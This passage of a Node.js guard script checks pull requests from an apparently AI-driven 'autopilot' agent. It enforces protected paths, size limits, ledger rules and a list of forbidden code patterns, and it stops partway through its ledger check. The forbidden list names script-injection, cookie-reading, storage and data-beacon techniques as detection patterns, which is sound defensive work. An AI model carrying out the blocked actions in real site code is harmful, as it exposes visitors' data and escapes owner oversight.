#!/usr/bin/env node
/**
 * What an autopilot pull request may change (docs/AUTOPILOT.md; the rules themselves are autopilot/CONSTITUTION.md).
 *
 *   node scripts/autopilot-guard.cjs --base origin/main --head HEAD [--branch autopilot/2026-10-15-home-hero] [--pr 61] [--json]
 *   node scripts/autopilot-guard.cjs --self-test     temporary git repositories covering every rule, pass and fail
 *
 * It reads the two commits with git alone (merge-base, diff, show, cat-file) and never runs code from the pull request,
 * so the "Autopilot merge" workflow can run main's copy of this file against a pull request's head. The diff is taken
 * from the merge base of --base and --head to --head, which is what the pull request adds.
 *
 * The branch comes from --branch, else GITHUB_HEAD_REF, else the checked-out branch when --head is HEAD. A branch that
 * does not start with autopilot/ passes without checks. --pr is the pull request's number, when known: new ledger
 * lines may then name only it. Exit 0 when there is nothing to report, 1 on any violation, 2 on a usage or git error.
 * --json prints the machine-readable result instead of the list.
 */
'use strict';
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

/**
 * Paths an autopilot pull request may never add, change, delete or rename. This list is the authoritative copy of
 * autopilot/CONSTITUTION.md §6; only the owner changes it, in a pull request that is not on an autopilot/ branch.
 * `**` matches across folders (and `**` followed by a slash also matches no folder at all), `*` within one path segment.
 * The privacy modules are protected under every extension: webpack resolves .js and .mjs before .tsx and .ts, so a
 * sibling such as lib/analytics.js would otherwise replace lib/analytics.ts in the bundle. Every components/Experiment*
 * file is the experiment framework (Experiment.tsx and ExperimentVariant.tsx, which holds useVariant); the registry,
 * lib/experiments.ts, is not protected.
 */
const PROTECTED = [
  'analysis/**', 'public/data/**', 'data/**', 'docs/evidence/**',
  'lib/analytics.*', 'lib/analytics-policy.*', 'lib/replay-policy.*', 'lib/event-policy.*', 'lib/data-fetch.*', 'lib/experiment-runtime.*', 'lib/chunk-reload.*',
  'components/SiteAnalytics.*', 'components/AnalyticsPreference.*', 'components/PageFeedback.*', 'components/SectionTracker.*', 'components/Experiment*',
  'app/privacy/**', 'app/**/error.*', 'app/**/global-error.*', 'app/**/not-found.*',
  'scripts/**', '.github/**', '.claude/**', 'CLAUDE.md', 'AGENTS.md',
  'autopilot/CONSTITUTION.md', 'autopilot/metrics.md',
  '**/package.json', 'package-lock.json', 'next.config.*', 'vercel.json', 'tsconfig.json', '.gitignore', '.npmrc', '.nvmrc', '.node-version',
  'docs/ANALYTICS.md', 'docs/AUTOPILOT.md', 'docs/PROJECT_HANDOFF.md', 'LICENSE*',
];

/**
 * The only places an autopilot pull request may touch at all. Anything else counts as protected too: every file at
 * the root, every dotfile in any folder (.env.production, .babelrc, .postcssrc, .vercelignore) and any new top-level
 * folder, because Next.js and Vercel read such files at build time.
 */
const ALLOWED = ['app/**', 'components/**', 'lib/**', 'hooks/**', 'context/**', 'public/**', 'styles/**', 'docs/**/*.md', 'autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];

/** Written for people, never built into the site: the only files whose added lines are not scanned. */
const PROSE = ['docs/**/*.md', 'autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];
/** A pull request that changes only these (existing ledger lines, the backlog, the learnings) is bookkeeping: it needs no new ledger line. */
const BOOKKEEPING = ['autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];

const BRANCH_PREFIX = 'autopilot/';
const BRANCH_NAME = /^autopilot\/(\d{4}-\d{2}-\d{2})-[a-z0-9]+(-[a-z0-9]+)*$/;
const BRANCH_MAX = 80;
const LIMITS = {
  files: 60, lines: 1500,
  binaryBytes: 600 * 1024, binaryTotalBytes: 2 * 1024 * 1024,
  textBytes: 200 * 1024, textTotalBytes: 1024 * 1024,
  lineLength: 3000, ledgerLines: 10, ledgerDateDays: 2, experimentMaxDays: 42,
};
const LEDGER = 'autopilot/ledger.jsonl';

/** Page and route handlers (and the metadata routes behind /robots.txt, /sitemap.xml and the manifest): URLs are owner decisions. */
const ROUTE_FILE = /^app\/(?:.+\/)?(?:page|route)\.(?:tsx?|jsx?|mdx?)$|^app\/(?:robots|sitemap|manifest)\.(?:tsx?|jsx?)$/;
/** New JavaScript in site code: it is not type-checked (allowJs is false), and webpack prefers it to a .ts file of the same name. */
const SITE_JS = /^(?:app|components|lib|hooks|context|styles)\/.+\.(?:js|jsx|mjs|cjs)$/;
/**
 * The only binary files an autopilot pull request may add or change: under public/ (not public/data/), and the
 * Next.js metadata images under app/ (favicon.ico, icon, apple-icon, opengraph-image and twitter-image files). Every
 * other file must be UTF-8 text, and is scanned.
 */
const MEDIA_TYPES = ['png', 'jpg', 'jpeg', 'webp', 'avif', 'gif', 'ico', 'woff', 'woff2', 'ttf', 'otf', 'pdf', 'mp4', 'webm'];
const MEDIA = new RegExp(`\\.(?:${MEDIA_TYPES.join('|')})$`, 'i');
const METADATA_IMAGE = /^app\/(?:.+\/)?(?:favicon\.ico|(?:icon|apple-icon|opengraph-image|twitter-image)\d*\.(?:png|jpe?g|gif|ico))$/;
const binaryAllowedAt = (file) => (file.startsWith('public/') && !file.startsWith('public/data/')) || METADATA_IMAGE.test(file);
const SCRIPT_FILE = /\.(?:[cm]?[jt]sx?)$/i;
const MARKUP_FILE = /\.(?:html?|svg|xml)$/i;

// An absolute or protocol-relative address right after an opening quote: "https://…", '//…', `http://…`.
const EXTERNAL = String.raw`[\x60'"]\s*(?:https?:)?\/\/`;
const EXTERNAL_BARE = String.raw`[\x60'"]?\s*(?:https?:)?\/\/`;

/**
 * Code that could run third-party code, write browser storage, send data off the site, load something from another
 * host (external images, fonts and media reveal visitors' IP addresses) or show error UI. Each rule is
 * [name, pattern, pattern for .js/.ts files]: in script files tags are matched case-sensitively, so React components
 * such as <Link>, <Frame> or <Embed> are not mistaken for <link>, <frame> or <embed>.
 */
const FORBIDDEN = [
  ['<script', /<script\b/i, /<script\b/],
  ['next/script', /next\/script/i],
  ['dangerouslySetInnerHTML', /dangerouslySetInnerHTML/i],
  ['HTML injection (innerHTML, outerHTML, insertAdjacentHTML, document.write)', /\b(?:inner|outer)HTML\s*=|insertAdjacentHTML|document\s*\.\s*write/],
  ['eval(', /\beval\s*\(/],
  ['new Function(', /\bFunction\s*\(/],
  ['document.cookie', /document\s*(?:\.\s*cookie|\[\s*[\x60'"]cookie)|\bcookieStore\b/],
  ['browser storage (localStorage, sessionStorage, indexedDB)', /localStorage|sessionStorage|indexedDB/i],
  ['navigator.sendBeacon', /sendBeacon/i],
  ['XMLHttpRequest', /XMLHttpRequest/i],
  ['new WebSocket', /\bWebSocket\b/],
  ['EventSource(', /\bEventSource\b/],
  ['PostHog', /posthog/i],
  // In script files <object is a tag only when no type punctuation follows it (Array<object>, Map<object, …>).
  ['<iframe, <embed or <object', /<(?:iframe|frame|embed|object)\b/i, /<(?:iframe|frame|embed)\b|<object\b(?!\s*[,|&>)\]])/],
  ['<base', /<base\b/i, /<base\b/],
  // In script files only an address (after a quote, "(" or "="), so copy such as "needs JavaScript: …" is fine.
  ['javascript: URL', /javascript:/i, /[\x60'"(=]\s*javascript\s*:/i],
  ['fetch( of an absolute URL', new RegExp(String.raw`\b(?:fetch|Request)\s*\(\s*(?:new\s+URL\s*\(\s*)?${EXTERNAL}`, 'i')],
  ['import( of an http(s) URL', new RegExp(String.raw`\bimport\s*\(\s*(?:\/\*[\s\S]*?\*\/\s*)?${EXTERNAL}|\bfrom\s+${EXTERNAL}`, 'i')],
  ['src=/srcSet= of an absolute URL', new RegExp(String.raw`\b(?:src|poster|action|formaction|ping|background)\s*=\s*\{?\s*${EXTERNAL}|\b(?:image)?srcset\s*=\s*\{?\s*[\x60'"][^\x60'"]*?(?:https?:)?\/\/`, 'i')],
  // Lower case in script files, so the URL constructor is left to the address scan below (which knows the site's own host).
  ['url( of an absolute URL', new RegExp(String.raw`\burl\s*\(\s*${EXTERNAL_BARE}`, 'i'), new RegExp(String.raw`\burl\s*\(\s*${EXTERNAL_BARE}`)],
  ['@import of an http(s) URL', new RegExp(String.raw`@import\s+(?:url\s*\(\s*)?${EXTERNAL_BARE}`, 'i')],
  ['<link>/<image>/<use> of an absolute URL', new RegExp(String.raw`<(?:link|image|use|feimage)\b[^>]*\b(?:xlink:)?href\s*=\s*\{?\s*${EXTERNAL}`, 'i'), new RegExp(String.raw`<(?:link|image|use|feImage)\b[^>]*\b(?:xlink:)?href\s*=\s*\{?\s*${EXTERNAL}`)],
  ['RTCPeerConnection / WebTransport', /RTCPeerConnection|WebTransport/],
  ['service worker', /serviceWorker|importScripts/],
  ['a custom error boundary (error pages are the owner\'s; app/**/error.tsx is protected)', /\b(?:getDerivedStateFromError|componentDidCatch)\b/],
];
/** In HTML and SVG files only: inline event handlers run script without a <script> tag. */
const FORBIDDEN_MARKUP = [['inline event handler (onload=, onerror=, …)', /\bon[a-z]+\s*=/i]];

/**
 * Hosts an added address may name outside a link: the site itself, and identifiers that are never fetched
 * (the citation DOI, JSON-LD and SVG namespaces, the owner's repositories). An entry with a path matches that prefix.
 */
const URL_ALLOWED = ['splithappens.run', 'www.splithappens.run', 'doi.org', 'schema.org', 'www.w3.org', 'www.sitemaps.org', 'github.com/koolkam00/'];
// An address in code: after a quote, a space, a comma, "(" or "="; protocol-relative ones only right after a quote, "(" or "=".
const URL_IN_CODE = /(^|[\x60'"\s,(=])((?:https?:)?\/\/)([a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,})(?::\d+)?(\/[^\s\x60'")]*)?/gi;
// Where an address is a destination or an identifier rather than something the page loads: href= (an <a> or a
// next/link <Link>); an href, url or link field of a list of links; the JSON-LD identifier fields license, sameAs,
// citation and @id; an XML namespace (xmlns:inkscape="http://…"). <link>, <use> and <image> hrefs have their own rule above.
const LINK_CONTEXT = /(?:\bhref\s*=\s*\{?\s*|\bxmlns(?::[\w-]+)?\s*=\s*|\b(?:href|url|link|license|sameAs|citation)\s*:\s*|[\x60'"]@id[\x60'"]\s*:\s*)$/i;
// An address whose host is computed (`https://${host}/…`, 'https://' + host): the address scan cannot read the host.
const COMPUTED_HOST = /([\x60'"])\s*(?:https?:)?\/\/(?:\$\{|\1\s*\+)/g;

/** Wording the site never uses (autopilot/CONSTITUTION.md §3), and release identifiers that never appear in visible copy. */
const BANNED = [
  ['"arithmetic"', /arithmetic/i],
  ['"the wall" (say "sustained slowdown")', /\bthe\s+wall\b(?![\s-]*clock)/i],
  ['"hit the wall"', /\bhit(s|ting)?\s+the\s+wall\b/i],
  ['"your chance" (shares are observed, never a chance)', /your\s+chance/i],
  // The tag itself; the prefix alone is how the data loaders check a release (release.tag.replace('private-export-', …)).
  ['"private-export-…" (release tags stay out of copy)', /private-export-\d/i],
  ['"20260912" (release tags stay out of copy)', /20260912/],
];

const LEDGER_REQUIRED = ['id', 'date', 'kind', 'title', 'hypothesis', 'primary_metric', 'guardrails', 'baseline', 'decision_rule', 'evaluate_after', 'status', 'pr', 'verdict', 'result'];
const LEDGER_MUTABLE = new Set(['status', 'verdict', 'result', 'evaluated_on', 'pr', 'shipped_on', 'notes']);
/** Fields that may be filled in once (from null or absent) and are then fixed, so a recorded outcome cannot be rewritten. */
const LEDGER_SET_ONCE = ['verdict', 'result', 'evaluated_on', 'pr', 'shipped_on'];
const LEDGER_KINDS = ['change', 'experiment', 'conclude', 'revert', 'fix'];
const LEDGER_STATUSES = ['proposed', 'shipped', 'reverted', 'concluded'];
/** How an entry's status may move; it never moves back. (proposed to concluded: marked shipped and judged in one pull request.) */
const LEDGER_NEXT = { proposed: ['shipped', 'concluded', 'reverted'], shipped: ['concluded', 'reverted'], concluded: ['reverted'], reverted: [] };
const LEDGER_VERDICTS = ['keep', 'revert', 'inconclusive', 'iterate', 'ship-variant', 'keep-control'];
const LEDGER_ID = /^\d{4}-\d{2}-\d{2}-[a-z0-9-]+$/;

// ---------- Small helpers ----------

function globRegex(glob) {
  let source = '';
  for (let i = 0; i < glob.length; i += 1) {
    if (glob.startsWith('**/', i)) { source += '(?:[^/]+/)*'; i += 2; }
    else if (glob.startsWith('**', i)) { source += '.*'; i += 1; }
    else if (glob[i] === '*') source += '[^/]*';
    else source += glob[i].replace(/[.+?^${}()|[\]\\]/g, '\\$&');
  }
  return new RegExp(`^${source}$`);
}
const compile = (globs) => globs.map((glob) => [glob, globRegex(glob)]);
const PROTECTED_RE = compile(PROTECTED);
const ALLOWED_RE = compile(ALLOWED);
const PROSE_RE = compile(PROSE);
const matching = (list, file) => (list.find(([, re]) => re.test(file)) || [])[0] || null;
/** Why a path is off limits ("lib/analytics.* is protected"), or null. */
function protectedBy(file) {
  const glob = matching(PROTECTED_RE, file);
  if (glob) return `${glob} is protected`;
  if (file.split('/').some((segment) => segment.startsWith('.'))) return 'dotfiles are protected';
  if (!matching(ALLOWED_RE, file)) return `outside the folders an autopilot pull request may change (${ALLOWED.join(', ')})`;
  return null;
}
const isProse = (file) => Boolean(matching(PROSE_RE, file));

function validDate(value) {
  if (typeof value !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(value)) return false;
  const date = new Date(`${value}T00:00:00Z`);
  return Number.isFinite(date.getTime()) && date.toISOString().slice(0, 10) === value;
}
const isObject = (value) => value !== null && typeof value === 'object' && !Array.isArray(value);
const sameJson = (a, b) => JSON.stringify(sortKeys(a)) === JSON.stringify(sortKeys(b));
function sortKeys(value) {
  if (Array.isArray(value)) return value.map(sortKeys);
  if (isObject(value)) return Object.fromEntries(Object.keys(value).sort().map((key) => [key, sortKeys(value[key])]));
  return value;
}
const brief = (value) => { const text = JSON.stringify(value); return text.length > 40 ? `${text.slice(0, 40)}…` : text; };

class GitError extends Error {}
function git(cwd, args, { buffer = false, allowFail = false } = {}) {
  try {
    return execFileSync('git', ['--no-pager', '--literal-pathspecs', '-c', 'core.quotePath=false', ...args], {
      cwd, encoding: buffer ? null : 'utf8', maxBuffer: 512 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (error) {
    if (allowFail) return null;
    const stderr = error.stderr ? String(error.stderr).trim() : '';
    throw new GitError(`git ${args.join(' ')} failed: ${stderr.split('\n')[0] || `exit status ${error.status}`}`);
  }
}

// ---------- Reading the change ----------

/** Every changed path between two commits: `git diff --raw -z -M` with full blob ids and modes. */
function changedEntries(cwd, from, to) {
  const tokens = git(cwd, ['diff', '--raw', '-z', '-M', '--no-abbrev', '--no-ext-diff', '--no-textconv', from, to]).split('\0');
  const entries = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const meta = tokens[i];
    if (!meta.startsWith(':')) continue;
    const [oldMode, newMode, oldSha, newSha, statusField] = meta.slice(1).split(' ');
    const status = statusField[0];
    const oldPath = tokens[i + 1];
    const twoPaths = status === 'R' || status === 'C';
    const newPath = twoPaths ? tokens[i + 2] : oldPath;
    i += twoPaths ? 2 : 1;
    entries.push({
      status, oldMode, newMode, oldSha, newSha,
      oldPath: status === 'A' ? null : oldPath,
      newPath: status === 'D' ? null : newPath,
    });
  }
  return entries;
}

const ZERO_SHA = /^0+$/;
function blob(cwd, sha) { return ZERO_SHA.test(sha) ? null : git(cwd, ['cat-file', 'blob', sha], { buffer: true }); }
const UTF8 = new TextDecoder('utf-8', { fatal: true });
/** Text means UTF-8 with no NUL byte. Decided here, not by git, so a .gitattributes file cannot hide a text change. */
function isText(buffer) {
  if (!buffer || buffer.includes(0)) return false;
  try { UTF8.decode(buffer); return true; } catch { return false; }
}

/** Added lines (with their line numbers in the new file) and the deleted lines of one text change. */
function textChange(cwd, from, to, entry) {
  const paths = [...new Set([entry.oldPath, entry.newPath].filter(Boolean))];
  const patch = git(cwd, ['diff', '--text', '-U0', '--no-color', '--no-ext-diff', '--no-textconv', '-M', from, to, '--', ...paths]);
  const added = [];
  const deleted = [];
  let inHunk = false;
  let next = 0;
  for (const line of patch.split('\n')) {
    if (line.startsWith('diff --git ')) { inHunk = false; continue; }
    const hunk = /^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(line);
    if (hunk) { inHunk = true; next = Number(hunk[1]); continue; }
    if (!inHunk) continue;
    if (line.startsWith('+')) { added.push({ line: next, text: line.slice(1) }); next += 1; }
    else if (line.startsWith('-')) deleted.push(line.slice(1));
  }
  return { added, deleted };
}
const allLines = (text) => text.split('\n').map((line, index) => ({ line: index + 1, text: line }));

/** Consecutive added lines joined into blocks, so a JSX tag or call split over several lines is scanned as one. */
function addedBlocks(added) {
  const blocks = [];
  for (const item of added) {
    const last = blocks[blocks.length - 1];
    if (last && item.line === last.lines[last.lines.length - 1] + 1) { last.lines.push(item.line); last.texts.push(item.text); }
    else blocks.push({ lines: [item.line], texts: [item.text] });
  }
  return blocks.map((block) => ({ ...block, text: block.texts.join('\n') }));
}
function lineAt(block, offset) {
  let seen = 0;
  for (let i = 0; i < block.texts.length; i += 1) {
    seen += block.texts[i].length + 1;
    if (offset < seen) return block.lines[i];
  }
  return block.lines[block.lines.length - 1];
}
/** True when every line a match spans is a line moved here unchanged from elsewhere in the change (see check()). */
function movedMatch(block, match, moved) {
  if (!moved.size) return false;
  const first = lineAt(block, match.index);
  const last = lineAt(block, match.index + Math.max(0, match[0].length - 1));
  return block.lines.filter((line) => line >= first && line <= last).every((line) => moved.has(line));
}
function scan(file, blocks, rules, rule, violations, moved = new Set()) {
  const reported = new Set();
  const script = SCRIPT_FILE.test(file);
  for (const block of blocks) {
    for (const [name, pattern, scriptPattern] of rules) {
      const chosen = script && scriptPattern ? scriptPattern : pattern;
      const global = new RegExp(chosen.source, chosen.flags.includes('g') ? chosen.flags : `${chosen.flags}g`);
      for (const match of block.text.matchAll(global)) {
        if (movedMatch(block, match, moved)) continue;
        const line = lineAt(block, match.index);
        const key = `${name}:${line}`;
        if (reported.has(key)) continue;
        reported.add(key);
        violations.push({ rule, file, line, message: `${name}: "${match[0].replace(/\s+/g, ' ').slice(0, 60)}"` });
      }
    }
  }
}

/** Is position `at` inside a quoted string on its line? An odd number of one kind of quote before it says so. */
const inString = (text, at) => {
  const before = text.slice(text.lastIndexOf('\n', at - 1) + 1, at);
  return ["'", '"', '`'].some((quote) => before.split(quote).length % 2 === 0);
};
const blank = (text) => text.replace(/[^\n]/g, ' ');
/**
 * Comments blanked out (same length, so offsets still map to lines): addresses in comments are notes, not loads. A
 * comment marker inside a string ('/*', ' //') is code, and a line inside a JSDoc comment whose opening line is not
 * part of the change (" * see https://…") is still a comment.
 */
const blankComments = (text) => text
  .replace(/\/\*[\s\S]*?\*\/|<!--[\s\S]*?-->/g, (comment, at, all) => (inString(all, at) ? comment : blank(comment)))
  .replace(/(^|[\s;{}])(\/\/.*)$/gm, (match, before, comment, at, all) => (inString(all, at + before.length) ? match : before + blank(comment)))
  .replace(/^(\s*)(\*(?:\s(?:(?!\*\/).)*)?)(?=\*\/|$)/gm, (match, indent, comment) => indent + blank(comment));

function urlAllowed(host, rest) {
  // Compared with a trailing slash, so github.com/koolkam00 matches the entry github.com/koolkam00/ (and github.com/koolkam00x does not).
  const target = `${host.toLowerCase()}${rest || '/'}/`;
  return URL_ALLOWED.some((entry) => (entry.includes('/') ? target.startsWith(entry) : host.toLowerCase() === entry));
}
const linkContext = (text, at) => LINK_CONTEXT.test(text.slice(Math.max(0, at - 60), at));
/** Added addresses on another host, wherever they are (constants, data, srcset lists, templates), unless they are a link's destination. */
function scanUrls(file, blocks, violations, moved = new Set()) {
  const reported = new Set();
  const report = (block, match, host, message) => {
    if (movedMatch(block, match, moved)) return;
    const line = lineAt(block, match.index);
    const key = `${host}:${line}`;
    if (reported.has(key)) return;
    reported.add(key);
    violations.push({ rule: 'forbidden-pattern', file, line, message });
  };
  for (const block of blocks) {
    const text = blankComments(block.text);
    for (const match of text.matchAll(URL_IN_CODE)) {
      const [, before, scheme, host, rest] = match;
      const quote = /[\x60'"]/.test(before);
      if (scheme === '//' && !(quote || before === '(' || before === '=')) continue;
      if (quote && linkContext(text, match.index)) continue;
      if (urlAllowed(host, rest)) continue;
      report(block, match, host, `an address on another host (${host}) outside a link: pages may not load anything from another host (it reveals visitors' IP addresses); a link's address goes in href= or in a url/href/link field`);
    }
    for (const match of text.matchAll(COMPUTED_HOST)) {
      if (linkContext(text, match.index)) continue;
      report(block, match, '(computed)', `an address whose host is computed ("${match[0].trim().slice(0, 30)}") outside a link: the guard cannot tell which host it loads from; write the address out in full`);
    }
  }
}

const showFile = (cwd, commit, file) => {
  const out = git(cwd, ['show', `${commit}:${file}`], { buffer: true, allowFail: true });
  return out === null ? null : out.toString('utf8');
};
/** JSX and JavaScript comments removed, so a commented-out <SiteAnalytics /> does not count as present. */
const withoutComments = (source) => source
  .replace(/\{\s*\/\*[\s\S]*?\*\/\s*\}/g, ' ')
  .replace(/\/\*[\s\S]*?\*\//g, ' ')
  .replace(/(^|[\s;{}])\/\/.*$/gm, '$1');
/** A pattern check, not a proof: the tag appears outside comments and not behind an always-false `false &&`. */
function rendersTag(source, tag) {
  const live = withoutComments(source);
  for (const match of live.matchAll(new RegExp(`<${tag}\\b`, 'g'))) {
    if (!/(?:\bfalse|\b0|\bnull|\bundefined)\s*&&\s*\(?\s*$/.test(live.slice(Math.max(0, match.index - 40), match.index))) return true;
  }
  return false;
}

// ---------- The ledger ----------

/** Non-blank lines (a leading byte-order mark and trailing carriage returns are ignored), each parsed. */
function parseLedger(text) {
  if (text === null) return null;
  const entries = [];
  text.replace(/^﻿/, '').split('\n').forEach((line, index) => {
    const raw = line.replace(/\r$/, '');
    if (!raw.trim()) return;
    let value; let error = null;
    try { value = JSON.parse(raw); } catch (e) { error = `does not parse as JSON (${e.message}); each entry is one JSON object on one line`; }
    if (!error && !isObject(value)) error = 'is not a JSON object';
    entries.push({ number: index + 1, raw, value: error ? null : value, error });
  });
  return entries;
}

function ledgerEntryProblems(value) {
  const problems = [];
  for (const key of LEDGER_REQUIRED) if (!(key in value)) problems.push(`missing "${key}"`);
  const has = (key) => key in value;
  if (has('id') && (typeof value.id !== 'string' || !LEDGER_ID.test(value.id))) problems.push('"id" must look like YYYY-MM-DD-some-slug');
  if (has('date') && !validDate(value.date)) problems.push('"date" must be a YYYY-MM-DD date');
  if (has('kind') && !LEDGER_KINDS.includes(value.kind)) problems.push(`"kind" must be one of ${LEDGER_KINDS.join(', ')}`);
  for (const key of ['title', 'hypothesis', 'primary_metric', 'decision_rule']) if (has(key) && typeof value[key] !== 'string') problems.push(`"${key}" must be a string`);
  if (has('title') && typeof value.title === 'string' && !value.title.trim()) problems.push('"title" is empty');
  if (has('guardrails') && !Array.isArray(value.guardrails)) problems.push('"guardrails" must be an array');
  if (has('baseline') && !isObject(value.baseline)) problems.push('"baseline" must be an object');
  // Experiment stopping rules are registered before launch and are immutable thereafter.
  if (value.kind === 'experiment') {
    if (!(Number.isSafeInteger(value.min_sample) && value.min_sample > 0)) problems.push('an experiment requires "min_sample" to be a positive safe integer');
    if (!(Number.isSafeInteger(value.max_days) && value.max_days >= 1 && value.max_days <= LIMITS.experimentMaxDays)) problems.push(`an experiment requires "max_days" to be an integer from 1 to ${LIMITS.experimentMaxDays}`);
  }
  if (has('evaluate_after')) {
    // A fix, a revert and the conclusion of an experiment are not judged later.
    const nullable = ['fix', 'revert', 'conclude'].includes(value.kind);
    if (!(validDate(value.evaluate_after) || (nullable && value.evaluate_after === null))) problems.push(`"evaluate_after" must be a YYYY-MM-DD date${nullable ? ' or null' : ' (null only for fix, revert and conclude)'}`);
  }
  if (has('status') && !LEDGER_STATUSES.includes(value.status)) problems.push(`"status" must be one of ${LEDGER_STATUSES.join(', ')}`);
  if (has('pr') && !(value.pr === null || (Number.isInteger(value.pr) && value.pr > 0))) problems.push('"pr" must be a pull request number or null');
  if (has('verdict') && !(value.verdict === null || LEDGER_VERDICTS.includes(value.verdict))) problems.push(`"verdict" must be null or one of ${LEDGER_VERDICTS.join(', ')}`);
  if (has('result') && !(value.result === null || isObject(value.result))) problems.push('"result" must be null or an object');
  for (const key of ['evaluated_on', 'shipped_on']) if (has(key) && !(value[key] === null || validDate(value[key]))) problems.push(`"${key}" must be null or a YYYY-MM-DD date`);
  return problems;
}

/**
 * A new entry is pre-registered: proposed, with no verdict, no result and no shipped_on (it is marked shipped once its
 * pull request has merged), with the branch's id, dated within two days of the branch, naming this pull request or none.
 * The one exception is the record of an earlier change whose pull request closed without merging: status reverted, verdict null or
 * inconclusive, any earlier date, and that pull request's number.
 */
function newEntryProblems(value, { branchDate, branchId, pr }) {
  const problems = [];
  const recordOfClosed = value.status === 'reverted';
  if (!recordOfClosed && branchId && value.id !== branchId) problems.push(`"id" must be "${branchId}", the branch name without "${BRANCH_PREFIX}"; only records of closed-unmerged pull requests may use another id`);
  if (!recordOfClosed && value.status !== 'proposed' && LEDGER_STATUSES.includes(value.status)) problems.push(`a new entry starts "proposed", not "${value.status}"; it is marked shipped once its pull request has merged`);
  if (value.result !== null && value.result !== undefined) problems.push('a new entry starts with "result": null; the result is written when it is evaluated');
  if (value.shipped_on !== null && value.shipped_on !== undefined) problems.push('a new entry has no "shipped_on"; it is set once its pull request has merged');
  if (recordOfClosed) {
    if (![null, undefined, 'inconclusive'].includes(value.verdict)) problems.push('a new "reverted" entry (the record of a pull request that closed unmerged) has "verdict" null or "inconclusive"');
  } else if (value.verdict !== null && value.verdict !== undefined) problems.push('a new entry starts with "verdict": null; the verdict is written when it is evaluated');
  if (branchDate && validDate(value.date)) {
    const days = (Date.parse(value.date) - Date.parse(branchDate)) / 86400000;
    if (days > LIMITS.ledgerDateDays || (days < -LIMITS.ledgerDateDays && !recordOfClosed)) problems.push(`"date" ${value.date} is more than ${LIMITS.ledgerDateDays} days from the branch date ${branchDate}`);
  }
  if (pr && Number.isInteger(value.pr) && value.pr !== pr && !recordOfClosed) problems.push(`"pr" is ${value.pr}; a new entry names this pull request (#${pr}) or null`);
  return problems;
}

/** An existing entry: only the mutable fields change, the status only moves forward, and set-once fields stay set. */
function existingEntryProblems(old, now) {
  const problems = [];
  const keys = new Set([...Object.keys(old), ...Object.keys(now)]);
  const changed = [...keys].filter((key) => !LEDGER_MUTABLE.has(key) && !sameJson(old[key], now[key]));
  if (changed.length) problems.push(`changed ${changed.map((k) => `"${k}"`).join(', ')}; existing entries may change only ${[...LEDGER_MUTABLE].join(', ')}`);
  if (old.status !== now.status && LEDGER_STATUSES.includes(old.status) && !LEDGER_NEXT[old.status].includes(now.status)) {
    problems.push(`"status" cannot go from "${old.status}" to "${now.status}"${LEDGER_NEXT[old.status].length ? ` (only to ${LEDGER_NEXT[old.status].join(' or ')})` : ''}`);
  }
  for (const key of LEDGER_SET_ONCE) {
    const before = old[key] === undefined ? null : old[key];
    if (before !== null && !sameJson(before, now[key] === undefined ? null : now[key])) problems.push(`"${key}" was already ${brief(before)}; once set it cannot change`);
  }
  return problems;
}

/**
 * The head's ledger against the base's. Existing lines are matched by id (a line that is not a valid entry, by
 * position), so a deleted line is reported once, as a deletion; every head line no base line matches is new.
 * `bookkeeping` (the pull request changes nothing but the three autopilot record files) waives the new line.
 * Otherwise the change needs its own proposed entry; records of closed-unmerged pull requests alone do not count.
 */
function checkLedger(baseText, headText, { violations, warnings, branchDate, branchId, pr, bookkeeping = false }) {
  const v = (line, message) => violations.push({ rule: 'ledger', file: LEDGER, line, message });
  const w = (line, message) => warnings.push({ rule: 'ledger', file: LEDGER, line, message });
  const head = parseLedger(headText);
  if (!head) { v(null, 'missing: every autopilot pull request appends a line to autopilot/ledger.jsonl'); return; }
  const base = parseLedger(baseText) || [];
  const idOf = (entry) => (entry.value && typeof entry.value.id === 'string' ? entry.value.id : null);
  const headById = new Map();
  for (const entry of head) if (idOf(entry) !== null && !headById.has(idOf(entry))) headById.set(idOf(entry), entry);
  const matched = new Map();
  const taken = new Set();
  for (const [index, old] of base.entries()) {
    const now = idOf(old) !== null ? headById.get(idOf(old)) : head[index];
    if (now && !taken.has(now)) { matched.set(old, now); taken.add(now); }
  }
  const removed = base.filter((old) => !matched.has(old));
  for (const old of removed) v(old.number, idOf(old) !== null ? `existing entry "${idOf(old)}" was removed; ledger lines are never deleted (an undone change is marked "reverted")` : 'an existing line was removed');
  // Existing lines stay first and in their order (checked only when none was removed, so one deletion is not reported again as a move).
  if (!removed.length) {
    const misplaced = base.findIndex((old, index) => head[index] !== matched.get(old));
    if (misplaced >= 0) v(matched.get(base[misplaced]).number, `existing entry ${idOf(base[misplaced]) ? `"${idOf(base[misplaced])}" ` : ''}moved from line ${base[misplaced].number}; existing lines stay where they are and new lines go at the end`);
  }
  const ids = new Map();
  for (const [old, now] of matched) {
    if (old.error) {
      // A broken line already on the base is reported, not held against this change; it may be repaired.
      if (now.raw === old.raw) w(old.number, `line ${old.error} (already on the base)`);
      else if (now.error) v(now.number, `line ${now.error}`);
      else for (const problem of ledgerEntryProblems(now.value)) v(now.number, problem);
      continue;
    }
    if (typeof now.value.id === 'string') ids.set(now.value.id, now.number);
    if (now.raw === old.raw) {
      for (const problem of ledgerEntryProblems(old.value)) w(old.number, `${problem} (already on the base)`);
      continue;
    }
    for (const problem of [...existingEntryProblems(old.value, now.value), ...ledgerEntryProblems(now.value)]) v(now.number, `entry "${old.value.id}": ${problem}`);
  }
  const added = head.filter((entry) => !taken.has(entry));
  if (!added.length && !bookkeeping) v(null, `adds no line (the base has ${base.length}, the head ${head.length}); append one entry for this change (only a pull request that changes nothing but existing ledger lines, autopilot/backlog.md and autopilot/LEARNINGS.md needs none)`);
  if (added.length && !bookkeeping && branchId && !added.some((entry) => entry.value?.id === branchId && entry.value.status === 'proposed')) v(null, `append a new "proposed" entry with id "${branchId}" for this change; a closed-unmerged record does not pre-register a site change`);
